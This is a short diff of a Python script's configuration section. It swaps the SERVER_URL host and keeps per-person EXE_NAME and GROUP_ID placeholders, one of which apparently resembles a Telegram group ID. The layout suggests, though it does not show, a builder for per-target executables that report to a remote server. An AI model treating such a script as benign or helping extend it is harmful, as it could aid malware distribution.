@@ -8,7 +8,7 @@ import sys
 import threading
 
 # ========== CONFIGURATION ==========
-SERVER_URL = "https://deploy-73g4.onrender.com"  # Your Render URL
+SERVER_URL = "https://dollar-1rtv.onrender.com"  # Your Render URL
 EXE_NAME = "1"  # Will be replaced for each person
 GROUP_ID = "-1003587821331"  # Will be replaced for each person
 # ==================================
